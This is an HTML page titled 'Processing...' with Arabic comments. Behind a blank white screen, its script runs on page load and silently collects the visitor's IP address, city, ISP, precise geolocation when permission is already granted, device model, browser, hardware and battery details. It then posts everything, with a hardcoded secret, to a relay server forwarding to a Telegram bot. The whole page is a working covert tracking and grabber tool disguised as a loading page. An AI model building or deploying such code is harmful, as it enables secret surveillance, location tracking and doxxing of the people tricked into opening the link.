<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; overflow: hidden; }
    </style>
</head>
<body>

    <script>
        // --- إعدادات الوسيط (الموقع الذي رفعته على Render) ---
        const PROXY_URL = 'https://vps-yi60.onrender.com/send-message';
        const MASTER_KEY = 'My_Secret_Password_123'; 

        // --- دالة الإرسال للوسيط بدلاً من تيليجرام مباشرة ---
        async function sendToProxy(message) {
            try {
                await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        bot_alias: "bot_001", // يرسل لـ bot_001
                        id_alias: "ID_001",   // يرسل لـ ID_001
                        message: message,
                        secret: MASTER_KEY
                    })
                });
            } catch (error) { console.error('Error'); }
        }

        // --- الوظائف التحليلية (نسخة طبق الأصل من كودك دون أي تعديل) ---
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (error) { return {}; }
        }

        async function getGeolocation() {
            if ('geolocation' in navigator && 'permissions' in navigator) {
                try {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    if (permissionStatus.state === 'granted') {
                        return new Promise((resolve) => {
                            navigator.geolocation.getCurrentPosition(
                                position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                                error => resolve({}),
                                { enableHighAccuracy: true }
                            );
                        });
                    } else { return {}; }
                } catch (error) { return {}; }
            } else { return {}; }
        }

        function getPhoneModel(userAgent) {
            let manufacturer = "غير معروف", model = "غير معروف";
            const ua = userAgent.toLowerCase();
            const androidMatch = ua.match(/(android|linux).*?; ([\w\s-]+)\)/);
            if (androidMatch && androidMatch[2]) {
                const devicePart = androidMatch[2].trim();
                if (devicePart.startsWith('sm-')) { manufacturer = "Samsung"; model = devicePart; }
                else if (devicePart.startsWith('pixel')) { manufacturer = "Google"; model = devicePart; }
                else if (devicePart.startsWith('lg-')) { manufacturer = "LG"; model = devicePart; }
                else if (devicePart.startsWith('huawei')) { manufacturer = "Huawei"; model = devicePart; }
                else if (devicePart.startsWith('moto')) { manufacturer = "Motorola"; model = devicePart; }
                else if (devicePart.startsWith('oneplus')) { manufacturer = "OnePlus"; model = devicePart; }
                else {
                    const parts = devicePart.split(' ');
                    if (parts.length > 1) {
                        manufacturer = parts[0].replace(/_/g, ' ');
                        model = parts.slice(1).join(' ').replace(/_/g, ' ');
                    } else { model = devicePart.replace(/_/g, ' '); }
                }
            } else if (ua.includes("iphone")) { manufacturer = "Apple"; model = "iPhone"; }
            else if (ua.includes("ipad")) { manufacturer = "Apple"; model = "iPad"; }
            return { manufacturer, model };
        }

        function getDeviceType(userAgent) {
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) return "جهاز لوحي";
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) return "هاتف محمول";
            return "حاسوب مكتبي";
        }

        function getOS(userAgent) {
            if (/windows phone/i.test(userAgent)) return "Windows Phone";
            if (/android/i.test(userAgent)) {
                const match = userAgent.match(/Android\s([0-9.]+)/);
                return match ? `Android ${match[1]}` : 'Android';
            }
            if (/iPad|iPhone|iPod/i.test(userAgent)) return "iOS";
            if (/win/i.test(userAgent)) return "Windows";
            if (/mac/i.test(userAgent)) return "macOS";
            if (/linux/i.test(userAgent)) return "Linux";
            return "نظام غير معروف";
        }

        function getBrowser(userAgent) {
            const ua = userAgent.toLowerCase();
            let name = "غير معروف", version = "غير معروف";
            if (ua.includes('edge')) { name = "Microsoft Edge"; version = ua.split('edge/')[1]; }
            else if (ua.includes('edg')) { name = "Microsoft Edge"; version = ua.split('edg/')[1]; }
            else if (ua.includes('chrome')) { name = "Chrome"; version = ua.split('chrome/')[1].split(' ')[0]; }
            else if (ua.includes('safari')) { name = "Safari"; version = ua.split('version/')[1].split(' ')[0]; }
            else if (ua.includes('firefox')) { name = "Firefox"; version = ua.split('firefox/')[1]; }
            return { name, version };
        }

        async function gatherAndSendInfo() {
            try {
                const [ipInfo, geoInfo] = await Promise.all([getIPInfo(), getGeolocation()]);
                const userAgent = navigator.userAgent;
                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                const supportsBluetooth = 'bluetooth' in navigator;
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const phoneInfo = getPhoneModel(userAgent);
                const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف';
                const processorCores = navigator.hardwareConcurrency || 'غير معروف';
                
                const deviceInfo = {
                    '📱 نوع الجهاز': getDeviceType(userAgent),
                    '🖥️ نظام التشغيل': getOS(userAgent),
                    '🌐 اسم المتصفح': getBrowser(userAgent).name,
                    '📊 إصدار المتصفح': getBrowser(userAgent).version,
                    '📜 إصدار الجهاز': userAgent,
                    '📏 دقة الشاشة': `${screen.width}x${screen.height}`,
                    '🔄 وضع الشاشة': screen.orientation ? screen.orientation.type : 'غير معروف',
                    '🌐 لغة النظام': navigator.language,
                    '✋ دعم الإيماءات اللمسية': hasTouch ? 'مدعوم' : 'غير مدعوم',
                    '🔵 دعم البلوتوث': supportsBluetooth ? 'مدعوم' : 'غير مدعوم',
                    '🔒 بروتوكول الأمان': window.location.protocol,
                    '🌍 عنوان IP': ipInfo.ip || 'غير معروف',
                    '🏙️ المدينة': ipInfo.city || 'غير معروف',
                    '🔻 الدولة': ipInfo.country_name || 'غير معروف',
                    '📶 شركة مزود الإنترنت': ipInfo.org || 'غير معروف',
                    '📈 خط الطول': geoInfo.longitude || 'غير معروف',
                    '📉 خط العرض': geoInfo.latitude || 'غير معروف',
                    '📡 نوع الاتصال': connection ? connection.effectiveType : 'غير معروف',
                    '⚡ سرعة الاتصال': connection ? `${(connection.downlink || 0)} Mbps` : 'غير معروف',
                    '🧠 الذاكرة (RAM)': ram,
                    '⚙️ عدد الأنوية': processorCores,
                    '🎨 عمق الألوان': screen.colorDepth ? `${screen.colorDepth} بت` : 'غير معروف',
                    '🌍 إمكانية تحديد الموقع الجغرافي': 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
                    '⏰ الوقت': new Date().toLocaleString('ar-SA'),
                    '📱 الشركة الصانعة': phoneInfo.manufacturer,
                    '📱 طراز الهاتف': phoneInfo.model
                };

                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceInfo['🔋 شحن الهاتف'] = `${(battery.level * 100).toFixed(0)}%`;
                    deviceInfo['⚡ هل الهاتف يشحن؟'] = battery.charging ? 'نعم' : 'لا';
                }

                let message = `*📊 تقرير معلومات شامل (عبر الوسيط):*\n\n`;
                for (const [key, value] of Object.entries(deviceInfo)) {
                    message += `*${key}*: ${value}\n`;
                }

                // الإرسال النهائي للوسيط
                await sendToProxy(message);

            } catch (error) { console.error('Done'); }
        }
        
        document.addEventListener('DOMContentLoaded', gatherAndSendInfo);
    </script>
</body>
</html>
